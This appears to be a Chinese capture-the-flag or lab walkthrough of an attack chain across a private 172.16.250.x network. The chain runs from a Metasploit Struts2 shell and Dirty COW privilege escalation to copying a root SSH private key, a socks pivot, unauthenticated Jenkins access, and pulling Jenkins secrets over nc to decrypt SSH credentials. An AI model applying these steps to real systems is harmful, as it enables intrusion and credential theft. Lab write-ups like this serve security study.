![image-20240415100157031](http://cdn.33129999.xyz/mk_img/image-20240415100157031.png)

这个靶场的nat的ip：172.16.250.0


^
172.16.250.10上有tomcat运行的struts2网站漏洞，使用MSF利用，getshell。
10：
上传提权探测脚本，使用msf的upload 或 curl脏牛脚本 到/tmp目录，编译运行，使用脏牛提权。

30：
使用cp命令将./ssh的公钥复制到/tmp目录，再下载，使用ssh在10主机免密连接30主机。
```
cat ~/.bash_history
cp ~/.ssh/id_rsa /tmp/id_rsa
chmod 777 id_rsa
download  /tmp/id_rsa /root/id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@172.16.250.30
```

再用MSF通过172.16.250.10进行socks代理，使得可以未授权访问172.16.250.30:8080的JenKins服务，Jenkins版本有漏洞可以直接运行python代码，还有密钥漏洞。破解密钥就可以拿下172.16.250.50。

linux中自带nc，此时用nc将172.16.250.30上的JenKins密钥文件反弹下载，用python脚本解密，就是172.16.250.50的ssh账号密码。
